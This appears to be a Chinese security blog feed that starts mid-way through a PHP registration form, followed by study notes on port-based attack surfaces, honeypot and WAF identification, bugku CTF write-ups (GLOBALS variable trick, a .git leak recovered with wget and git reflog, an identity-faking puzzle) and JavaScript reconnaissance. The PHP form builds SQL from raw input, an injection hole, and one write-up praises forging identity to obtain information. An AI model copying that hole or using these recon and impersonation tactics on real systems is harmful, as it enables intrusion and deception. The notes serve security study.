<span class="string">&quot;users&quot;</span>;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SHOW TABLES LIKE &#x27;<span class="subst">$tableName</span>&#x27;&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) == <span class="number">1</span>;</span><br><span class="line">                <span class="variable">$sqltable</span> = <span class="string">&quot;INSERT INTO users (username,password,user_type,email,user_id,mobile_number,user_addr) VALUES (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,<span class="subst">$user_type</span>,&#x27;<span class="subst">$email</span>&#x27;,&#x27;<span class="subst">$user_id</span>&#x27;,&#x27;<span class="subst">$mobile_number</span>&#x27;,&#x27;<span class="subst">$user_addr</span>&#x27;)&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sqltable</span>);</span><br><span class="line">                <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0018</title>
      <link href="/2023/04/03/SEC-Study-0018/"/>
      <url>/2023/04/03/SEC-Study-0018/</url>
      
        <content type="html"><![CDATA[<p>主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全</p><span id="more"></span><h1 id="常见端口安全"><a href="#常见端口安全" class="headerlink" title="常见端口安全"></a>常见端口安全</h1><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td></tr><tr><td>tcp/udp 53</td><td>DNS</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td></tr><tr><td>tcp/udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的Web服务端口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>ldap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Oracle</td><td>tns爆破,注入,弹shell…</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破,想办法钓VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase/DB2</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5902</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat</td><td>Ajp    Tomcat-Ajp协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere</td><td>Java反序列化/弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><table><thead><tr><th>蜜罐</th><th>Quake系统搜索语法</th></tr></thead><tbody><tr><td>STRUTSHONEYPOT</td><td>app:”StrutsHoneypot”</td></tr><tr><td>CONPOT HTTP 蜜罐</td><td>app:”Conpot Http 蜜罐”</td></tr><tr><td>CONPOT MODBUS 蜜罐</td><td>app:”Conpot modbus 蜜罐”</td></tr><tr><td>CONPOT S7 蜜罐</td><td>app:”Conpot s7 蜜罐”</td></tr><tr><td>KIPPO 蜜罐</td><td>app:”kippo 蜜罐”</td></tr><tr><td>HONEYPY HTTP 蜜罐</td><td>app:”Honeypy Http 蜜罐”</td></tr><tr><td>HONEYPY ES蜜罐</td><td>app:”Honeypy ES蜜罐”</td></tr><tr><td>AMUN IMAP 蜜罐</td><td>app:”amun imap 蜜罐”</td></tr><tr><td>AMUN HTTP蜜罐</td><td>app:”amun http蜜罐”</td></tr><tr><td>NEPENTHES NETBIOS蜜罐</td><td>app:”Nepenthes netbios蜜罐”</td></tr><tr><td>NEPENTHES FTP 蜜罐</td><td>app:”Nepenthes FTP 蜜罐”</td></tr><tr><td>SSHESAME SSH 蜜罐</td><td>app:”sshesame ssh 蜜罐”</td></tr><tr><td>OPENCANARY蜜罐管理后台</td><td>app:”opencanary蜜罐管理后台”</td></tr><tr><td>DIONAEA SIPD 蜜罐</td><td>app:”Dionaea sipd 蜜罐”</td></tr><tr><td>DIONAEA SMBD 蜜罐</td><td>app:”Dionaea smbd 蜜罐”</td></tr><tr><td>DIONAEA HTTP 蜜罐</td><td>app:”Dionaea Http 蜜罐”</td></tr><tr><td>DIONAEA MSSQL 蜜罐</td><td>app:”Dionaea MSSQL 蜜罐”</td></tr><tr><td>DIONAEA FTP 蜜罐</td><td>app:”Dionaea ftp 蜜罐”</td></tr><tr><td>DIONAEA MEMCACHED 蜜罐</td><td>app:”Dionaea Memcached 蜜罐”</td></tr><tr><td>KOJONEY SSH 蜜罐</td><td>app:”Kojoney SSH 蜜罐”</td></tr><tr><td>WEBLOGIC蜜罐</td><td>app:”weblogic蜜罐”</td></tr><tr><td>MYSQL蜜罐</td><td>app:”MySQL蜜罐”</td></tr><tr><td>HFISH蜜罐</td><td>app:”HFish蜜罐”</td></tr><tr><td>HFISH蜜罐管理后台</td><td>app:”HFish蜜罐管理后台”</td></tr><tr><td>HONEYTHING物联网蜜罐</td><td>app:”honeything物联网蜜罐”</td></tr><tr><td>ELASTICSEARCH蜜罐</td><td>app:”elasticsearch蜜罐”</td></tr><tr><td>HOSTUS蜜罐</td><td>app:”HostUS蜜罐”</td></tr><tr><td>WHOISSCANME蜜罐</td><td>app:”whoisscanme蜜罐”</td></tr><tr><td>未知蜜罐</td><td>app:”未知蜜罐”</td></tr><tr><td>COWRIE TELNETD蜜罐</td><td>app:”Cowrie telnetd蜜罐”</td></tr><tr><td>GLASTOPF蜜罐</td><td>app:”glastopf蜜罐”</td></tr></tbody></table><p><img src="c1.jpg" alt="资料"></p><h1 id="识别-Web服务器-请求返回包"><a href="#识别-Web服务器-请求返回包" class="headerlink" title="识别-Web服务器-请求返回包"></a>识别-Web服务器-请求返回包</h1><h1 id="识别-应用服务器-端口扫描技术"><a href="#识别-应用服务器-端口扫描技术" class="headerlink" title="识别-应用服务器-端口扫描技术"></a>识别-应用服务器-端口扫描技术</h1><h1 id="识别-其他服务协议-端口扫描技术"><a href="#识别-其他服务协议-端口扫描技术" class="headerlink" title="识别-其他服务协议-端口扫描技术"></a>识别-其他服务协议-端口扫描技术</h1><ul><li>Web中间件探针</li><li>应用中间件探针</li><li>数据库类型探针</li><li>其他服务协议探针</li></ul><p>端口扫描：Nmap、Masscan、网络空间(fofa)<br>开放状态：Close Open Filtered</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">官网</span><br><span class="line">- nmap    : https:<span class="comment">//nmap.org/download.html</span></span><br><span class="line">- masscan : https:<span class="comment">//github.com/robertdavidgraham/masscan</span></span><br><span class="line"></span><br><span class="line">使用参考：</span><br><span class="line">- masscan: https:<span class="comment">//blog.csdn.net/qq_53079406/article/details/125266331</span></span><br><span class="line">- nmap   : https:<span class="comment">//blog.csdn.net/qq_53079406/article/details/125263917</span></span><br><span class="line"></span><br><span class="line">编译masscan：https:<span class="comment">//www.cnblogs.com/lzy575566/p/15513726.html</span></span><br><span class="line"></span><br><span class="line">考虑：<span class="number">1</span>、防火墙保护 <span class="number">2</span>、内网环境</span><br><span class="line"></span><br><span class="line">内网环境可能出现情况：</span><br><span class="line">明明数据库端口开的，网站也能正常打开，</span><br><span class="line">但是你对目标进行端口扫描，发现数据库端口没有开放（排除防火墙问题）</span><br><span class="line">内网内的机器可以扫到内网主机的端口，外网的机器扫内网主机时，内网主机的IP地址被解析到路由器的公网IP上，只要路由器不开放端口，外网主机就扫不到端口。</span><br><span class="line"></span><br><span class="line">不是内网主机，扫不到对应的端口，就搞不了内网主机。</span><br><span class="line">软件：nmap</span><br><span class="line">网站：fofa</span><br></pre></td></tr></table></figure><h1 id="识别-WAF防火墙-看图-amp-项目-amp-指纹"><a href="#识别-WAF防火墙-看图-amp-项目-amp-指纹" class="headerlink" title="识别-WAF防火墙-看图&amp;项目&amp;指纹"></a>识别-WAF防火墙-看图&amp;项目&amp;指纹</h1><p>1、WAF解释：<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。<br>利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><blockquote><p>一句话：保证web安全，一般是绕不过的。<br>拿到泄露数据一提交，算漏洞，拿奖金。</p></blockquote><p>2、WAF分类：</p><blockquote><p>云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等  –面向客户：中大型企业，大黑产，擦边等<br>硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品 –面向客户：中大型企业，国企军工等<br>软件WAF：宝塔，安全狗、D盾等 –面向客户：小众型软件，黑X没钱的–目前能绕过的</p><blockquote><p>前三者较为常见<br>看见其他安全产品要绕过–&gt;直接跑路，因为最多只能绕过无关紧要的东西<br>代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的</p></blockquote></blockquote><p>3、识别看图：<br>拦截页面，identywaf项目内置</p><p>4、识别项目：</p><p>*下载<a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wafw00f-2.2.0 使用Python setup.py install 安装，进入wafw00f目录调用main函数对网站的WAF进行识别。</span><br></pre></td></tr></table></figure><p>*下载<a href="https://github.com/stamparm/identYwaf">identywaf</a></p><p>网络空间也可以分析网站有哪些WAF。</p><h1 id="识别-蜜罐平台-人工-amp-网络空间-amp-项目"><a href="#识别-蜜罐平台-人工-amp-网络空间-amp-项目" class="headerlink" title="识别-蜜罐平台-人工&amp;网络空间&amp;项目"></a>识别-蜜罐平台-人工&amp;网络空间&amp;项目</h1><ol><li><p>蜜罐解释：<br>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。<br>安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。<br>攻击方可以通过蜜罐识别技术来发现和规避蜜罐。<br>因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p></li><li><p>蜜罐分类：<br>根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐、高交互蜜罐。<br>当然还可以根据蜜罐模拟的目标进行分类，比如：数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等。</p></li><li><p>蜜罐产品：<br>见上图</p></li><li><p>识别原理：<br><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">点我看文章</a></p></li><li><p>识别技术：<br>0、测试安装<br><a href="https://hfish.net/#/">蜜罐搭建</a>大概了解组成功能等</p></li></ol><p>1、项目<br>项目识别<br><a href="https://github.com/graynjo/Heimdallr">浏览器嗅探工具</a>–<a href="https://github.com/360quake/quake_rs">360qake工具</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quake.exe init apikey值</span><br><span class="line">quake.exe honeypot 目标</span><br></pre></td></tr></table></figure><p>2、人工</p><blockquote><ul><li>端口多而有规律性<ul><li>规律性是指：端口排序的规律性，例如9806,9807,9808…</li></ul></li><li>Web访问协议就下载<ul><li>ssh，mysql应用蜜罐</li><li>攻击时记录账密</li><li>采用jsonp传输</li><li>web http访问该端口，采用协议下载文件</li><li>简单来说，就是蜜罐再怎么模拟也还是web功能。</li></ul></li><li>设备指纹分析（见上图）</li></ul></blockquote><p>人工分析：平台无法分析出来的时候得靠人工。</p><p>是否是蜜罐的分析方式：平台+软件+人工分析。</p><p>3、网络空间<br><a href="http://hunter.qianxin.com/">鹰图</a>，<a href="https://quake.360.cn/quake/#/index">360Quake</a><br>刚部署上去的平台，不能在部署的那个时间节点平台就识别出蜜罐。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-005</title>
      <link href="/2023/04/03/CTF-web-005/"/>
      <url>/2023/04/03/CTF-web-005/</url>
      
        <content type="html"><![CDATA[<p>CTF题，源于bugku<br>睡前几道小题</p><span id="more"></span><p>不知道怎么找源码：代码能力太差。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$10<span class="variable">$t9x</span>/ty500X5nCo97d01oyeTRRxbnWWzLQzLqjFLL7KJWz0RKwpuHK</span><br><span class="line">知道加密加密算法=&gt;直接尝试</span><br><span class="line">不知道算法知道源码=&gt;在源码当中查看加密的方式，获取加密的方法，尝试解密</span><br></pre></td></tr></table></figure><p>前端可以看到源代码，后端即使是php也看不到源代码。</p><h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="c1.jpg" alt="题目源"><br><img src="c2.jpg" alt="题目源"><br>得题如上<br>方向：<br>1.是不是需要函数绕过？<br>2.绕过函数后要怎么得到flag值？</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;        <span class="comment">// 导入并且包含</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);   <span class="comment">// 代码高亮显示不执行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment">// 检测get传参有效性</span></span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];  <span class="comment">// 赋值</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>, <span class="variable">$args</span>)) &#123; </span><br><span class="line">        <span class="comment">//preg_match函数，检测$args是否符合正则表达式</span></span><br><span class="line">        <span class="comment">// 正则表达式：匹配字母数字下划线，至少1个</span></span><br><span class="line">        <span class="comment">// 如果匹配正确，返回布尔值1</span></span><br><span class="line">        <span class="comment">// !1=null</span></span><br><span class="line">        <span class="comment">// 跳过if函数执行后续的eval函数 </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">    <span class="comment">// eval函数：将字符串转化为表达式并且执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的精髓就是$args传什么参数才能使$$args得到一个有效的值，得到flag。<br>这里需要引入php的特殊变量：<br><img src="c3.jpg" alt="PHP超全局变量"><br>挨个试一遍，可以发现，传入GLOBALS时得到flag<br><img src="c4.jpg" alt="flag"><br><img src="c10.jpg" alt="flag"></p><blockquote><p>这道题目除了直接传入GLOBALS外，还有一个办法：使用Burp进行爆破。当然，前提是有php字典。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用PHP的超全局变量能得到一些意想不到的信息。</p><h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="a1.jpg" alt="题"><br><img src="a2.jpg" alt="html"><br>得到这题目的第一件事情：转burp抓包，看数据包的头部<br><img src="a3.jpg" alt="解决"><br>flag手到擒来<br><img src="a4.jpg" alt="flag"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>观察抓取的数据包即可。</p><h1 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.jpg" alt="题"><br><img src="b3.jpg" alt="题"><br><img src="b2.jpg" alt="题"><br>这题有点脑洞大开了……<br>讲下思路：<br>原本你问它flag的时候，它是不会回答你的，它的要求是：只告诉它男朋友<br>尝试使用它给出的男朋友的QQ号去登录时，它会告诉你：思考的方向错了<br>既然要男朋友才能说，登录QQ号又不给登，那……<br>原本我打算抓取cookie的，发现Cookie从头到尾都没变动过，就断定这不是思考的方向了。<br>思来想去，只剩下一个办法：假装是它男朋友。<br>昵称伪造+头像伪造。这里的昵称伪造是要看昵称对不对的。昵称源QQ号改过一次，原昵称是“小bug”。<br>尝试昵称+头像的伪装，尝试询问flag：<br><img src="b10.jpg" alt="题"><br><img src="b11.jpg" alt="题"></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>人不能太死板，要学会适当情况下 <strong>伪造身份</strong> 获取相对有用的信息。</p><h1 id="source"><a href="#source" class="headerlink" title="source"></a>source</h1><h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>得题：<br><img src="d1.jpg" alt="题"><br><img src="d2.jpg" alt="题"><br>题目提示信息：</p><ol><li>描述：我哥说渗透我只用linux环境</li><li>source</li><li>一个网址</li></ol><p>解题：</p><ol><li>按照寻常思路，把网址放到御剑去扫，没扫出个所以然，放弃扫描的思路。</li><li>使用GitHack下载文件，发现个假flag……放弃GitHack下载思路。</li><li>使用Linux下载<ol><li>使用这个有一个大前提：确定文件夹是否存在。访问文件夹，通过状态码来确定。</li><li>其次就是调用Linux的wget进行递归下载</li></ol></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 使用wget下载:wget -r http:<span class="comment">//114.67.175.224:10746/.git</span></span><br><span class="line"><span class="number">2</span>. 使用git查找日志：git reflog</span><br><span class="line"><span class="comment"># git reflog </span></span><br><span class="line"><span class="title function_ invoke__">d256328</span> (HEAD -&gt; master) HEAD@&#123;<span class="number">0</span>&#125;: reset: moving to d25632</span><br><span class="line"><span class="number">13</span>ce8d0 HEAD@&#123;<span class="number">1</span>&#125;: commit: flag is here?</span><br><span class="line">fdce35e HEAD@&#123;<span class="number">2</span>&#125;: reset: moving to fdce35e</span><br><span class="line">e0b8e8e HEAD@&#123;<span class="number">3</span>&#125;: reset: moving to e0b8e</span><br><span class="line"><span class="number">40</span>c6d51 HEAD@&#123;<span class="number">4</span>&#125;: commit: flag is here?</span><br><span class="line">fdce35e HEAD@&#123;<span class="number">5</span>&#125;: commit: flag is here?</span><br><span class="line"><span class="title function_ invoke__">d256328</span> (HEAD -&gt; master) HEAD@&#123;<span class="number">6</span>&#125;: commit: flag is here?</span><br><span class="line">e0b8e8e HEAD@&#123;<span class="number">7</span>&#125;: <span class="title function_ invoke__">commit</span> (initial): this is index.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 使用git show 切换到指定的分支，得到flag</span><br><span class="line">─<span class="comment"># git show 40c6d51</span></span><br><span class="line">commit <span class="number">40</span>c6d51b81775a1590c1b051d9562222e41c4741</span><br><span class="line">Author: vFREE &lt;flag@flag.com&gt;</span><br><span class="line">Date:   Sun Jan <span class="number">17</span> <span class="number">20</span>:<span class="number">34</span>:<span class="number">43</span> <span class="number">2021</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">    flag is here?</span><br><span class="line"></span><br><span class="line">diff --git a/flag.txt b/flag.txt</span><br><span class="line">index aa6f6dc.<span class="number">.726e5</span>d1 <span class="number">100644</span></span><br><span class="line">--- a/flag.txt</span><br><span class="line">+++ b/flag.txt</span><br><span class="line">@@ -<span class="number">1</span> +<span class="number">1</span> @@</span><br><span class="line">-flag&#123;nonono&#125;</span><br><span class="line">+flag&#123;git_is_good_distributed_version_control_system&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="d10.jpg" alt="题"></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>涉及知识点有：</p><ul><li>Linux wget语法<ul><li>递归下载：wget -r 你的url</li><li>wget参考<a href="https://www.cnblogs.com/lukelook/p/11201098.html">点我</a></li></ul></li><li>git语法<ul><li>部分语法可以参照<a href="https://www.cnblogs.com/mrchige/p/6347011.html">这个简易版本</a></li><li>详细语法可以参照<a href="https://zhuanlan.zhihu.com/p/604138332">这个详细版本</a></li></ul></li><li>渗透测试之信息收集<ul><li>开发者不小心上传.git文件所产生的漏洞</li><li>源码泄露相关文章<a href="https://www.secpulse.com/archives/124398.html">点我</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0017</title>
      <link href="/2023/04/02/SEC-Study-0017/"/>
      <url>/2023/04/02/SEC-Study-0017/</url>
      
        <content type="html"><![CDATA[<p>信息打点</p><span id="more"></span><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><blockquote><p>CMS<br>Discuz、WordPress、Ecshop、蝉知等</p></blockquote><blockquote><p>前端技术<br>HTML5、jquery、bootstrap、Vue等</p></blockquote><blockquote><p>开发语言<br>PHP、JAVA、Ruby、Python、C#，JS等</p></blockquote><blockquote><p>Web服务器<br>Apache、Nginx、IIS、lighttpd，Apache等</p></blockquote><blockquote><p>应用服务器：<br>Tomcat、Jboss、Weblogic、Websphere等</p></blockquote><blockquote><p>数据库类型：<br>Mysql、SqlServer、Oracle、Redis、MongoDB等</p></blockquote><blockquote><p>操作系统信息<br>Linux、windows等</p></blockquote><blockquote><p>应用服务信息：<br>FTP、SSH、RDP、SMB、SMTP、LDAP、Rsync等</p></blockquote><blockquote><p>CDN信息<br>帝联、Cloudflare、网宿、七牛云、阿里云等</p></blockquote><blockquote><p>WAF信息<br>创宇盾、宝塔、ModSecurity、玄武盾、OpenRASP等。</p></blockquote><blockquote><p>蜜罐信息：<br>HFish、TeaPot、T-Pot、Glastopf等</p></blockquote><blockquote><p>其他组件信息<br>fastjson、shiro、log4j、OA办公等</p></blockquote><h1 id="JS前端框架"><a href="#JS前端框架" class="headerlink" title="JS前端框架"></a>JS前端框架</h1><h2 id="什么是JS渗透测试？"><a href="#什么是JS渗透测试？" class="headerlink" title="什么是JS渗透测试？"></a>什么是JS渗透测试？</h2><blockquote><p>JS：前端的JS与后台服务器的JS是一模一样的。<br>在Javascript中也存在变量和函数，当存在 <strong>可控变量</strong> 及 <strong>函数调用</strong> 即可 <strong>参数漏洞</strong><br>JS开发的WEB应用和PHP，JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。<br>获取URL，获取JS敏感信息，获取代码传参等，所以相当于 <strong>JS开发的WEB应用</strong> 属于 <strong>白盒测试（默认有源码参考）</strong> ，</p></blockquote><h1 id="前端获取-："><a href="#前端获取-：" class="headerlink" title="前端获取 ："></a>前端获取 ：</h1><ul><li>寻找更多的JS文件</li><li>从JS寻找更多的url地址(打点所获取的东西)</li><li>寻找JS代码逻辑<ul><li>加密算法</li><li>APIkey配置</li><li>验证逻辑等</li></ul></li><li>最终：扫到更多的JS，获取更多的接口和信息</li></ul><blockquote><p>前提：Web应用可以采用后端或前端语言开发</p><ul><li>后端语言：php java python .NET 浏览器端看不到真实的源代码</li><li>前端语言：JavaScript(JS)和JS框架 浏览器端看到真实的源代码</li></ul></blockquote><p>例子：</p><ul><li>zblog：核心功能采用PHP语言去传输接受</li><li>vue.js：核心功能采用框架语法（JS）传输接受</li></ul><h1 id="JS渗透"><a href="#JS渗透" class="headerlink" title="JS渗透"></a>JS渗透</h1><p>1、JS安全问题</p><blockquote><p>源码泄漏<br>未授权访问  = JS里面分析更多的URL访问确定接口路径<br>敏感key泄漏 = JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）<br>API接口安全 =（代码中加密提交参数传递，更多的URL路径）<br>JS的打点最终目的：配置信息，账号密码，登录地址等</p></blockquote><p>2、流行的Js框架有那些？</p><blockquote><p>Vue NodeJS jQuery Angular等</p></blockquote><p>3、如何判定JS开发应用？</p><blockquote><p>插件wappalyzer</p><blockquote><p>用于获取部分中间件及配置信息(小众型)<br>源程序代码简短<br>引入多个js文件<br>一般有/static/js/app.js等顺序的js文件<br>一般cookie中有connect.sid</p></blockquote></blockquote><p>4、如何获取更多的JS文件？</p><blockquote><p>手工-浏览器搜索<br>半自动-Burpsuite插件<br>工具化-各类提取&amp;FUZZ项目</p></blockquote><p>5、如何快速获取价值信息？</p><p>在JS文件当中，可以搜索以下关键字</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> src=</span><br><span class="line">path=</span><br><span class="line"> <span class="attr">method</span>:<span class="string">&quot;get&quot;</span></span><br><span class="line"> http.<span class="title function_">get</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string"> method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string"> http.post(&quot;</span></span><br><span class="line"> $.ajax</span><br><span class="line"> <span class="attr">http</span>:<span class="comment">//service.httppost</span></span><br><span class="line"> <span class="attr">http</span>:<span class="comment">//service.httpget</span></span><br></pre></td></tr></table></figure><p>挖到链接，尝试访问后可以差不多等于挖到漏洞了。</p><h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>浏览器全局搜索分析</p><p>需要一定的代码基础。</p><h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><blockquote><p>自带功能：Target-&gt;sitemap-&gt;Engagement tools-&gt;Find scripts<br>官方插件：JS Link Finder(这个插件基于插件加载器) &amp; JS Miner<br>第三方插件：HaE &amp; Unexpected_information<br>插件加载器：jython-standalone-2.7.2</p></blockquote><p>Unexpected_information：</p><blockquote><p><a 